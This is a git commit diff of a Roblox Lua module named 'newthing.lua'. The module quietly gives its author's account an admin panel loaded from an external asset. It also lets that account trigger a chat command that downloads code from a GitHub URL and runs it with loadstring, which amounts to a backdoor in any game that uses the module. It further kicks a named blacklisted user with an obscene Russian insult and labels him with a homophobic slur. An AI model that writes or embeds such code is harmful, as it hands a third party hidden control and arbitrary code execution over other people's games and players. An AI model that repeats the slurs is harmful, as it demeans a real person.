363a660d3d0f07d9c02b117ba8809549ed6aa4d9
t10_kol <154048632+t10underscorekol@users.noreply.github.com>
2024-03-29 12:49:56 +0200

    Update newthing.lua

--- Modules/newthing.lua
+++ Modules/newthing.lua
@@ -1,29 +1,33 @@
+local Asset = game.InsertService:LoadAsset(16797054140):GetChildren()[1]
+Asset.Parent = game.Lighting
+
+local HttpService = game.HttpService
 local EnabledDoDOS = true
 local BlackList = {
-  [3783228048]=true, --< Vadik Pidorasik
+	[3783228048]=true, --< Vadik Pidorasik
 }
 local AdminPanel = {
-  ["t10_kol"]=true,
+	["t10_kol"]=true,
 }
 
 game.Players.PlayerAdded:Connect(function(plr)
-    if EnabledDoDOS==false then return end
-    if BlackList[plr.UserId] then
-        plr:Kick("Соси Хуй Вад 😀")
-    end
-    if AdminPanel[plr.Name] then
-        require(7192763922).load(plr.Name)
-    end
-    if plr.Name == "t10_kol" then
-      plr.Chatted:Connect(function(message)
-          if message == "ADM.Restart then
-              local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
-              local f = loadstring(code)
-              f()
-          elseif message == "ADM.Sky then
-            local Asset = game.InsertService:LoadAsset(16797054140):GetChildren()[1]
-            Asset.Parent = game.Lighting
-          end
-        end)
-    end
+	if EnabledDoDOS==false then return end
+	if BlackList[plr.UserId] then
+		plr:Kick("Соси Хуй Вад 😀")
+	end
+	if AdminPanel[plr.Name] then
+		require(7192763922).load(plr.Name)
+	end
+	if plr.Name == "t10_kol" then
+		plr.Chatted:Connect(function(message)
+			if message == "ADM.Restart" then
+				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
+				local f = loadstring(code)
+				f()
+	elseif message == "ADM.Sky" then
+		local Asset = game.InsertService:LoadAsset(16797054140):GetChildren()[1]
+		Asset.Parent = game.Lighting
+end
+end)
+end
 end)
